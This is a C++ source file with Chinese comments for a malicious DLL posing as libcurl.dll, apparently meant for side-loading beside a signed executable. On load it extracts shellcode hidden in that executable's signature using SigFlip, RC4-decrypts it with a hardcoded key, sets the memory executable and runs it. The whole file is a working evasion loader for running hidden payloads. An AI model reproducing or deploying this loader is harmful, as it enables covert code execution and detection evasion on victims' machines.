// dllmain.cpp : 定义 DLL 应用程序的入口点。
#include <stdio.h>
#include <stdlib.h>
#include "unlock.hpp"
#include "SigFlip.h"
#include "function.h"

// DLL名称
char dll[] = "libcurl.dll";
// 密钥
unsigned char key[] = "IOgoIUYHlhiu";

/*
    入口函数
*/
VOID Entry() {
    DWORD size = 0;
    DWORD old;
    BYTE* shellcode = NULL;
    char exePATH[MAX_PATH];

    // 获取白exe绝对路径
    GetModuleFileNameA(NULL, exePATH, MAX_PATH);

    // 加载签名中的shellcode
    shellcode = SigFlipLoader(exePATH, &size);
    if (shellcode == NULL) {
        exit(-1);
    }

    // RC4解密shellcode (DLL名称作为密钥)
    decrypt(shellcode, size, key, sizeof(key) - 1, shellcode);
    
    // 运行shellcode (以函数指针为例，可更换为其他方式)
    VirtualProtect(shellcode, size, PAGE_EXECUTE_READWRITE, &old);
    ((void(*)())shellcode)();
}

/*
    DLLMain
*/
BOOL APIENTRY DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
                     )
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
        UNLOCK();
        Entry();
        break;
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}

